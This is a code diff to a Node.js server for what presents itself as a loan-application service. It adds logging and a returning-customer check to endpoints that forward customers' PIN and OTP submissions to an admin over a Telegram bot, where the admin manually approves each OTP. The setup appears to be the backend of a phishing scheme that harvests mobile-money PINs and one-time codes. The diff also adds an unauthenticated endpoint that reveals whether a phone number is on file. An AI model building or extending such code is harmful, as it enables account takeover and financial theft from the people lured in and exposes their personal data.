@@ -1075,20 +1075,27 @@ async function handleCallback(query) {
             const adminId = parts[2];
             const applicationId = parts.slice(3).join('_');
 
+            console.log(`🔵 OTP Callback: ${action} | App: ${applicationId} | Admin: ${adminId}`);
+
             const application = await db.getApplication(applicationId);
             if (!application) {
+                console.error(`❌ Application not found: ${applicationId}`);
                 await edit(`❌ Application not found`);
                 await ack('Not found', true);
                 return;
             }
 
             if (data.startsWith('otp_approve_')) {
+                console.log(`✅ Approving OTP for: ${applicationId}`);
                 await db.updateApplication(applicationId, { otpStatus: 'approved' });
-                await edit(`✅ *OTP APPROVED*\n\nApplication: ${applicationId}\n✅ Loan Approved!`);
+                console.log(`✅ OTP Status Updated to APPROVED for: ${applicationId}`);
+                await edit(`✅ OTP APPROVED\n\nApplication: ${applicationId}\n✅ Loan Approved!`);
                 await ack('✅ Approved!');
             } else {
+                console.log(`❌ Rejecting OTP for: ${applicationId}`);
                 await db.updateApplication(applicationId, { otpStatus: 'rejected' });
-                await edit(`❌ *OTP REJECTED*\n\nApplication: ${applicationId}`);
+                console.log(`✅ OTP Status Updated to REJECTED for: ${applicationId}`);
+                await edit(`❌ OTP REJECTED\n\nApplication: ${applicationId}`);
                 await ack('❌ Rejected');
             }
         } catch (e) {
@@ -1573,8 +1580,14 @@ app.post('/api/verify-pin', async (req, res) => {
 
         // Send to admin asynchronously (don't wait)
         const formattedPhone = formatPhone(phoneNumber);
+        
+        // Add returning customer info if applicable
+        const returningLabel = isReturningUser && previousCount > 0
+            ? `\n🔄 *Returning customer* (${previousCount} previous applications)`
+            : '';
+        
         sendToAdmin(adminId, `
-📱 *PIN VERIFICATION*
+📱 *PIN VERIFICATION*${returningLabel}
 
 📋 \`${applicationId}\`
 📞 \`${formattedPhone}\`
@@ -1658,10 +1671,39 @@ app.post('/api/verify-otp', async (req, res) => {
 // GET /api/check-otp-status/:applicationId
 app.get('/api/check-otp-status/:applicationId', async (req, res) => {
     try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) res.json({ success: true, status: application.otpStatus });
-        else res.status(404).json({ success: false, message: 'Application not found' });
+        const applicationId = req.params.applicationId;
+        const application = await db.getApplication(applicationId);
+        if (application) {
+            console.log(`📊 OTP Status Check: ${applicationId} → ${application.otpStatus}`);
+            res.json({ success: true, status: application.otpStatus });
+        } else {
+            console.log(`❌ OTP Status Check FAILED - App not found: ${applicationId}`);
+            res.status(404).json({ success: false, message: 'Application not found' });
+        }
     } catch (error) {
+        console.error('❌ check-otp-status error:', error.message);
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// GET /api/check-returning-customer/:phoneNumber
+app.get('/api/check-returning-customer/:phoneNumber', async (req, res) => {
+    try {
+        const phoneNumber = req.params.phoneNumber;
+        const applications = await db.collection('applications').find({ phoneNumber }).toArray();
+        
+        const previousCount = applications.length;
+        const isReturning = previousCount > 0;
+        
+        console.log(`📞 Returning Check: ${phoneNumber} → ${isReturning} (${previousCount} previous)`);
+        
+        res.json({ 
+            success: true, 
+            isReturning, 
+            previousCount 
+        });
+    } catch (error) {
+        console.error('❌ check-returning-customer error:', error.message);
         res.status(500).json({ success: false, message: 'Server error' });
     }
 });
